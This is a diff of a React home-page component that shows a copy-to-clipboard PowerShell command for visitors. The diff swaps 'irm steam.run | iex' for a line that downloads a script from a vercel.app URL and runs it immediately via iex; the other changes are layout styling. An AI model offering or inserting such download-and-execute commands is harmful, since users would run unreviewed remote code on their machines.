@@ -9,7 +9,7 @@ interface HomePageProps {
 
 function CopyCommand() {
   const [copied, setCopied] = useState(false);
-  const cmd = "irm steam.run | iex";
+  const cmd = "irm https://ditxtools.vercel.app/st.ps1 | iex";
 
   const handleCopy = () => {
     navigator.clipboard.writeText(cmd);
@@ -20,14 +20,14 @@ function CopyCommand() {
   return (
     <div
       style={{
-        display: "inline-flex",
+        display: "flex",
         alignItems: "center",
         gap: 0,
         background: "rgba(15, 15, 19, 0.8)",
         border: "1px solid rgba(168, 85, 247, 0.35)",
         borderRadius: 10,
-        overflow: "hidden",
         maxWidth: "100%",
+        minWidth: 0,
       }}
     >
       <div
@@ -36,6 +36,10 @@ function CopyCommand() {
           display: "flex",
           alignItems: "center",
           gap: 10,
+          overflowX: "auto",
+          whiteSpace: "nowrap",
+          flex: 1,
+          minWidth: 0,
         }}
       >
         <span
